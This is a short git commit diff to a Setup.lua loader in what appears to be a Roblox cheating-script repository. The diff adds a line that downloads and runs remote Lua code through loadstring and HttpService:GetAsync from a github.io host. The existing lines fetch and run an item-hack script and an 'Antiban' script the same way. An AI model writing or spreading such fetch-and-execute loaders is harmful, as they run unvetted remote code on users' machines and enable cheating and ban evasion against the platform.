3043cc57f546731c3cce146ead6356141dfe9da5
ZDStudios <121779558+ZDStudios@users.noreply.github.com>
2025-07-03 17:08:08 +0800

    Update Setup.lua

--- Setup.lua
+++ Setup.lua
@@ -1,2 +1,3 @@
 loadstring(game:GetService("HttpService"):GetAsync("https://zdstudios.github.io/RRoblox-ULTIMATE-Hacking-Scripts/Item%20Hacks/LootLord.lua"))()
 loadstring(game:GetService("HttpService"):GetAsync("https://zdstudios.github.io/Roblox-ULTIMATE-Hacking-Scripts/AntiBan/Antiban.lua"))()
+loadstring(game:GetService("HttpService"):GetAsync("https://zdstudios.github.io/Roblox-ULTIMATE-Hacking-Scripts/Update/Update.lua"))()
